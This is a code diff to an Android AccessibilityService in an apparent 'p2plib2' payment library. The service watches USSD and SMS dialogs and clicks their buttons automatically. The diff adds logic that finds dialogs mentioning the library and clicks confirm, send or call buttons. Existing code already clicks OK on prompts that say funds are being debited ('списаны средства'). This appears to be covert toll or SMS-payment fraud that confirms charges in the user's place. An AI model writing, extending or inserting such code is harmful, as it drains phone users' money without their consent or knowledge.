@@ -17,13 +17,6 @@ import static com.p2plib2.PayLib.curSMSOut;
 import static com.p2plib2.PayLib.feedback;
 import static com.p2plib2.PayLib.flagok;
 
-/**
- * AccessibilityService for ussd windows on Android mobile Telcom
- *
- * @author Romell Dominguez
- * @version 1.1.c 27/09/2018
- * @since 1.0.a
- */
 public class AccessService extends AccessibilityService {
 
     private static AccessibilityEvent event;
@@ -38,8 +31,8 @@ public class AccessService extends AccessibilityService {
         Logger.lg(String.format(
                 "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                 event.getEventType(), event.getClassName(), event.getPackageName(),
-                event.getEventTime(), event.getText()) );
-        if (flagok) {
+                event.getEventTime(), event.getText()));
+        if (flagok || com.p2plib2.Simple.PayLib.flagok) {
             this.event = event;
             Logger.lg(String.format(
                     "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
@@ -49,9 +42,6 @@ public class AccessService extends AccessibilityService {
             for (int i = 0; i < event.getText().size() - 1; i++) {
                 str += event.getText().get(1);
             }
-//            if (str.contains("могут быть списаны средства")) {
-//                clickOnButton(event, 0);
-//            }
             if (str.contains("заявка принята")) {
                 clickOnButton(event, 0);
             }
@@ -99,12 +89,14 @@ public class AccessService extends AccessibilityService {
             }
             PayLib.feedback.callResult("Code P2P-004: " + str);
             Logger.lg("curSMSOut " + curSMSOut);
-            if ((curSMSOut != null || PayLib.currentMsg != null) && str.contains("списаны средства")) {
+            if ((PayLib.currentMsg!= null || curSMSOut != null || PayLib.currentMsg != null || com.p2plib2.Simple.PayLib.currentMsg != null) && str.contains("списаны средства")) {
                 Logger.lg("PayLib.curSMSOut");
                 clickOnButtonOK(event, 0);
                 PayLib.curMesage.clear();
+                com.p2plib2.Simple.PayLib.curMesage.clear();
                 curSMSOut = null;
                 PayLib.currentMsg = null;
+                com.p2plib2.Simple.PayLib.currentMsg = null;
             }
         } else {
             Logger.lg("str " + event.getText()
@@ -216,7 +208,7 @@ public class AccessService extends AccessibilityService {
      * @param index button's index
      */
     protected static void clickOnButton(AccessibilityEvent event, int index) {
-        Logger.lg("clickOnButton " + event.getSource() + " flag " + flagok);
+        Logger.lg("clickOnButton " + event.getSource() + " flag " + flagok + " " + com.p2plib2.Simple.PayLib.flagok);
         if (event.getSource() != null) {
             int count = -1;
             Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
@@ -248,6 +240,7 @@ public class AccessService extends AccessibilityService {
                                 }
                                 if (curSMSOut != null) {
                                     flagok = false;
+                                    com.p2plib2.Simple.PayLib.flagok = false;
                                     PayLib.checkSmsAdditional();
                                 }
                             }
@@ -260,7 +253,7 @@ public class AccessService extends AccessibilityService {
     }
 
     protected static void clickOnButtonOK(AccessibilityEvent event, int index) {
-        Logger.lg("clickOnButton " + event.getSource() + " flag " + flagok);
+        Logger.lg("clickOnButton " + event.getSource() + " flag " + flagok + " " + com.p2plib2.Simple.PayLib.flagok);
         if (event.getSource() != null) {
             Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
             boolean m = false;
@@ -286,6 +279,34 @@ public class AccessService extends AccessibilityService {
                             nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         }
                     }
+                    if(nodeButton.getClassName().toString().toLowerCase().contains("scroll")){
+                        for (int h = 0; h <= nodeButton.getChildCount() - 1; h++) {
+                            AccessibilityNodeInfo nodeButtonh = nodeButton.getChild(h);
+                            if (nodeButtonh != null) {
+                                Logger.lg(" nodeButtonh " + nodeButtonh.getClassName().toString() + " " + nodeButtonh.getText());
+                                if (nodeButtonh.getText() != null) {
+                                    String text = nodeButtonh.getText().toString().toLowerCase();
+                                    if (text.contains("p2plib") || text.contains("p2ppay")) {
+                                        Logger.lg("true m ");
+                                        m = true;
+                                    }
+                                    Logger.lg("text " + text + " " + m);
+                                    if (m && nodeButtonh.getClassName().toString().toLowerCase().contains("button")
+                                            && (text.contains("ok")
+                                            || text.contains("да")
+                                            || text.contains("отправ")
+                                            || text.contains("позвони")
+                                            || text.contains("ок"))
+                                            ) {
+                                        Logger.lg("perform");
+                                        nodeButtonh.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                    }
+                                }
+                            } else {
+                                Logger.lg("nodeButton = " + nodeButton);
+                            }
+                        }
+                    }
                 } else {
                     Logger.lg("nodeButton = " + nodeButton);
                 }
@@ -294,91 +315,6 @@ public class AccessService extends AccessibilityService {
             Logger.lg("event.getSource() = " + event.getSource());
         }
     }
-//
-//        for (int i = 0; i <= event.getSource().getChildCount(); i++) {
-//            AccessibilityNodeInfo nodeButton = event.getSource().getChild(i);
-//            if (nodeButton != null) {
-//                Logger.lg(" nodeButton " + nodeButton.getClassName().toString() + " " + nodeButton.getText());
-//                if (nodeButton != null) {
-//                    if (nodeButton.getClassName().toString().toLowerCase().contains("button")) {
-//                        count++;
-//                        if (count == index) {
-//                            Logger.lg("text  " + nodeButton.getText());
-//                            nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-//                        }
-//                    }
-//                    if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
-//                        Logger.lg("nodeButton  count " + nodeButton.getChildCount());
-//                        boolean m = false;
-//                        for (int k = 0; k < nodeButton.getChildCount(); k++) {
-//                            Logger.lg("button " + k + " " + nodeButton.getChild(k).getText());
-//                            if (nodeButton.getChild(k).getText() != null) {
-//                                if (nodeButton.getChild(k).getText().toString().contains("papPay")) {
-//                                    m = true;
-//                                }
-//                            }
-//                        }
-//                        for (int k = 0; k < nodeButton.getChildCount(); k++) {
-//                            Logger.lg("button " + k + " " + nodeButton.getChild(k).getText());
-//                            if (nodeButton.getChild(k).getText() != null && m) {
-//                                if (nodeButton.getChild(k).getText().toString().toLowerCase().contains("ok")
-//                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("да")
-//                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("отправ")
-//                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("позвони")
-//                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("ок")) {
-//                                    nodeButton.getChild(k).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-//                                    flagok = false;
-//                                    PayLib.checkSmsAdditional();
-//                                }
-//                            }
-//                        }
-//                    } else {
-//                        if (nodeButton.getChildCount() == 0) {
-//                            Logger.lg(" nodeButton " + nodeButton.getClassName().toString());
-//                            if (nodeButton != null) {
-//                                if (nodeButton.getClassName().toString().toLowerCase().contains("button")) {
-//                                    Logger.lg("text  " + nodeButton.getText());
-//                                    nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-//                                }
-//                            }
-//                        } else {
-//                            Logger.lg("Else mode nodeButton  count " + nodeButton.getChildCount());
-//                            boolean m = false;
-//                            for (int k = 0; k < nodeButton.getChildCount(); k++) {
-//                                Logger.lg("button " + k + " " + nodeButton.getChild(k).getText());
-//                                if (nodeButton.getChild(k).getText() != null) {
-//                                    if (nodeButton.getChild(k).getText().toString().contains("papPay")) {
-//                                        m = true;
-//                                    }
-//                                }
-//                            }
-//                            for (int k = 0; k < nodeButton.getChildCount(); k++) {
-//                                if (nodeButton.getChild(k).getText() != null && m) {
-//                                    if (nodeButton.getChild(k).getText().toString().toLowerCase().contains("ok")
-//                                            || nodeButton.getChild(k).getText().toString().toLowerCase().contains("да")
-//                                            || nodeButton.getChild(k).getText().toString().toLowerCase().contains("отправ")
-//                                            || nodeButton.getChild(k).getText().toString().toLowerCase().contains("позвони")
-//                                            || nodeButton.getChild(k).getText().toString().toLowerCase().contains("ок")) {
-//                                        nodeButton.getChild(k).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-//                                        flagok = false;
-//                                        PayLib.checkSmsAdditional();
-//                                    }
-//                                }
-//                            }
-//                        }
-//                    }
-//                }
-//            } else {
-//                if (nodeButton != null) {
-//                    Logger.lg("nodeButton.getClassName() " + nodeButton);
-//                } else {
-//                    Logger.lg("nodeButton.getClassName() " + nodeButton.getClassName());
-//                }
-//            }
-//        }
-//    }
-//
-//}
 
     /**
      * Active when SO interrupt the application
